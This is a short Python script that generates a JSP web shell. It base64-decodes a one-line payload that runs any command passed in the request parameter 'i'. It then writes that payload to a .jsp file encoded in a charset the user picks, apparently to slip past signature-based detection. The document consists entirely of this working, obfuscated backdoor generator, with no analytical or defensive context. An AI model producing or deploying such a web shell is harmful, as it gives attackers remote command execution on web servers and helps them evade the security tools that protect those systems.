import base64
webshell = base64.b64decode('PCVSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJpIikpOyU+').decode('ascii')
charset = '<%@ page contentType="charset={cs}" %>'
if __name__ == '__main__':
    _charset = input('Enter Your Charset:')
    if _charset:
        with open(f'{_charset}.jsp', 'wb') as f:
            f.write(charset.format(cs=_charset).encode('ascii'))
            f.write(webshell.encode(_charset))
